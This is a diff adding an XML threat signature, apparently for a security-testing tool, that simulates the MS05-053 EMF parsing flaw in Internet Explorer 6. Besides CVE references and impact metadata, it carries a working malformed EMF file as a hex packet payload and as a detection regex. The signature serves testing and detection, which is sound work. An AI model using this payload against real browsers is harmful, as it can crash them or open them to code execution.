@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MS05-053 EMF file parsing flaw in GDI32.DLL"/>
+    <EngDesc display="true" value="This threat causes the Internet Explorer web browser to crash by sending a malformed EMF file which is processed by the GetEnhMetaFilePaletteEntries() function, ending in a crash.  This can lead to a denial of service condition, and possibly remote code execution.  This attack comes from webservers, which typically listen on port 80.  This threat is a client attack that comes from the virtual server."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Internet_Explorer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Explorer_6.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.microsoft.com/technet/security/bulletin/MS05-053.mspx"/>
+    <CVEID display="true" value="CVE-2005-0803"/>
+    <bugtraqID display="true" value="12834"/>
+    <OSVDB display="true" value="20580"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="000001077db8f8dc00c000a80001003c0882bc48"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200238593750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X48\X54\X54\X50\X2F\X31\X2E\X31\X20\X32\X30\X30\X20\X4F\X4B\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X4C\X65\X6E\X67\X74\X68\X3A\X20\X31\X32\X30\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X54\X79\X70\X65\X3A\X20\X69\X6D\X61\X67\X65\X2F\X78\X2D\X65\X6D\X66\X0D\X0A\X0D\X0A\X01\X00\X00\X00\X64\X00\X00\X00\X93\X00\X00\X00\X02\X00\X00\X00\X83\X01\X00\X00\X39\X01\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\XD1\X08\X00\X00\XBE\X06\X00\X00\X20\X45\X4D\X46\X00\X00\X01\X00\X78\X00\X00\X00\X17\X00\X00\X00\X03\X00\X00\X00\X0F\X00\X00\X00\X64\X00\X00\X00\X41\X00\X00\X00\XC8\X12\X00\X00\XC2\X1A\X00\X00\XCC\X00\X00\X00\X22\X01\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X0E\X00\X00\X00\X14\X00\X00\X00\X41\X00\X00\X00\X41\X42\X43\X44\X00\X00\X01\XFF"/>
+    <Created value="1139462294" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F72306F746D332E656D6620485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A436F6E74656E742D4C656E6774683A203132300D0A436F6E74656E742D547970653A20696D6167652F782D656D660D0A0D0A0100000064000000930000000200000083010000390100000000000000000000D1080000BE06000020454D46000001007800000017000000030000000F0000006400000041000000C8120000C21A0000CC000000220100000000000000000000000000000E000000140000004100000041424344000001FF" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
